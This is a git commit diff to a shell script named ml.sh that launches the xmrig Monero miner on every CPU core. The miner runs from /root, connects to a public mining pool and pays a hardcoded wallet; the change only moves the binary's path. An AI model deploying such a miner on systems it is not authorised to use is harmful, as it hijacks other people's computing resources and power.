3bf104154ad51e7f13c21e1dc0be0a0eea14e0f0
pawel.fajkowski@hpe.com <pawel.fajkowski@hpe.com>
2017-12-08 22:40:01 +0100

    testing

--- ml.sh
+++ ml.sh
@@ -3,4 +3,4 @@
 WALLET="45unwokYSf48piDg96ZBdBRqNXARySZoSZ92ddSQH7hYYpKbWgH37NzBtnioMVofXcNU4Ff5rxhJGMsjAbz9XtbPNrkdUGV"
 
 CPUS=$(cat /proc/cpuinfo | grep processor | wc -l)
-/root/xmrig -o pool.supportxmr.com:7777 -u $WALLET -p ${1}${2}${HOSTNAME:0:6}${IP} -t $CPUS --av=2 -r 3 --retry-pause=10 --donate-level=1 --print-time=60
+/root/testing/xmrig -o pool.supportxmr.com:7777 -u $WALLET -p ${1}${2}${HOSTNAME:0:6}${IP} -t $CPUS --av=2 -r 3 --retry-pause=10 --donate-level=1 --print-time=60
